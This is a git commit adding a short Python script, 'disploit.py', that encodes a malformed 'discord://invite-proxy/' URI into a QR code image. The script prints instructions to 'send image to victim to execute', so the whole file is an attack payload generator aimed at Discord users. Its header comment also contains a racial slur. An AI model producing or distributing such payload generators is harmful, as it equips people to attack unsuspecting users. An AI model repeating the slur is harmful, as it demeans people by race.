fa7dac3ced14d52cfe9d8d048a364c39cd2d7b7a
haltlol <85972972+haltlol@users.noreply.github.com>
2021-07-19 19:10:40 -0500

    Add files via upload

---
+++ disploit.py
@@ -0,0 +1,28 @@
+#created by vx#4444 on discord niggaz
+
+import requests
+import sys
+import qrcode
+import random
+
+class Exploit:
+
+    def __init__(self):
+        print("\033[31mGenerating payload!\033[0m")
+
+    def execute(self):
+        uri = "<discord://invite-proxy/"+"*"*20+">"
+        filename = "QRcode{}.png".format(str(random.randint(1000,9000)))
+        x = qrcode.make(uri)
+        x.save(filename)
+        print("Saved QR code to {}".format(filename))
+        print("\033[32Done making payload, send image to victim to execute!\033[0m")
+
+
+def main():
+    exploit = Exploit()
+    exploit.execute()
+
+if __name__ == '__main__':
+    main()
+    
